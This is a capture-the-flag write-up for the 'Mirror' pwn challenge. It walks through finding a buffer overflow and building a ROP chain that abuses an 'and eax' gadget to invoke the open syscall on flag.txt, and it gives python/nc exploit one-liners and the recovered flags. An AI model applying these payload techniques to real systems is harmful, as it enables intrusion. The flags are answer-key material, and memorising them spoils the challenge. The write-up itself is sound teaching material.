Mirror - Pwn

![image](https://user-images.githubusercontent.com/81467647/179567310-f3554de7-60ea-4463-98d9-a2d300c751bd.png)

Lets run the program and figure out what happend

![image](https://user-images.githubusercontent.com/81467647/179567495-9d477bd9-78e5-477e-8df3-cc8f1ca7b892.png)

So basically we enter input and get back the same string that we entered, after messing around a litile bit more we found someting that look like BOF.

![image](https://user-images.githubusercontent.com/81467647/179567929-96d59a6e-d92f-4eec-82a0-c8c359c73270.png)

Lets dig dipper with Gdb, we can see 4 function:

![image](https://user-images.githubusercontent.com/81467647/179568023-6ff9ac4d-f386-485c-8ea9-a04ae3b8ad44.png)

1) mirror

  ![image](https://user-images.githubusercontent.com/81467647/179568178-c32b2aec-2200-4144-89bb-e942f5979ac2.png)
  
  We can see that its a function that if "cmp    rdx,0x55" is not happend we just get out of the program, otherwise we hit the return value of the function.
  So after some messing around i discoverd that rdx register can be manipulted by the length on the string (our input) and the highest number is 0x70. In decimal value it is 85 - 112.

So my first try was to change the return address of this function to print_flag function, lets see what happend (\x3d\x10\x40\x00\x00\x00\x00\x00 address of prinf_flag)

python -c "print('A'*16+'\x3d\x10\x40\x00\x00\x00\x00\x00'+'A'*75)"  | nc 0.cloud.chals.io 14397

MCL{N0t_50_ea5y!}

We get wrong flag, if we check print_flag function we can see why --> the function open file that call "false_flag.txt" and print his output.

![image](https://user-images.githubusercontent.com/81467647/179569912-f88049d3-d269-4b80-b010-6df0b06b21e8.png)

Then i realze that i can use any syscall that i want with number 85-112 if i jump back here and pop rdi and pop rsi, its mean that i have control on 2 arguments and number of the syscall

![image](https://user-images.githubusercontent.com/81467647/179570761-9f7cced0-9f80-4486-ae09-73bfeef8b612.png)

Here is the fun part, it can be solve as they want (in the description of the challange they say link, why?), I decide to trick the challange a little bit, by get full control on eax value and change it to 2.
Why 3? because it is a syscall open, and if i manage to open flag.txt I can print it by print_flag function.

So i use Ropper execellent tool to find some instruction in the program. and I run this command "ropper --file Mirror --search "and eax""

![image](https://user-images.githubusercontent.com/81467647/179571853-988dcb56-0050-4050-8c81-45b25eed1c9b.png)

The last line look useful, we can change eax register by and command with the value 0x402017, so if we look at this in Binary we get:

0x402017 --> 010000000010000000010111

&&

Our value

=

syscall 2 -->000000000000000000000010

Our value need to be --> 0000000001100010 --> in decimal its 98 in our range 85-112, and as we can see its work!

![image](https://user-images.githubusercontent.com/81467647/179574289-769a9526-9b43-4d8e-a40d-b936a63b035b.png)

And one step after we can see that rax=2.

![image](https://user-images.githubusercontent.com/81467647/179574384-28dcd929-b172-4659-95a2-eb6e56119e11.png)

So now all we need to do is to change rsi value to flag.txt (locate in \x06\x20\x40\x00\x00\x00\x00\x00)

![image](https://user-images.githubusercontent.com/81467647/179574764-94150d32-c2c6-4ec5-a1e5-4d852878d205.png)

Finalliy lets get the flag:

1) "and eax, 0x402017" - Address --> \x31\x10\x40\x00\x00\x00\x00\x00

2) "pop    rdi" - Address --> \x2a\x10\x40\x00\x00\x00\x00\x00

3) "flag.txt" - Address --> \x06\x20\x40\x00\x00\x00\x00\x00

4) "mov    rdi,rax" - Address --> \x58\x10\x40\x00\x00\x00\x00\x00 (print_flag function)

Run this command:

python -c 'print("A"*16 +"\x31\x10\x40\x00\x00\x00\x00\x00"+"\x2a\x10\x40\x00\x00\x00\x00\x00"+"\x06\x20\x40\x00\x00\x00\x00\x00"+"\x00"*16 +"\x31\x10\x40\x00\x00\x00\x00\x00"+"\x58\x10\x40\x00\x00\x00\x00\x00"+ "C"*25)' | nc 0.cloud.chals.io 14397

AAAAAAAAAAAAAAAA1@*@ @1@X@CCCCCCCCCCCCCCCCCCCCCCCCC

MCL{D1D_y0u_U53_50f7_0R_H4Rd_L1Nk?}   




  
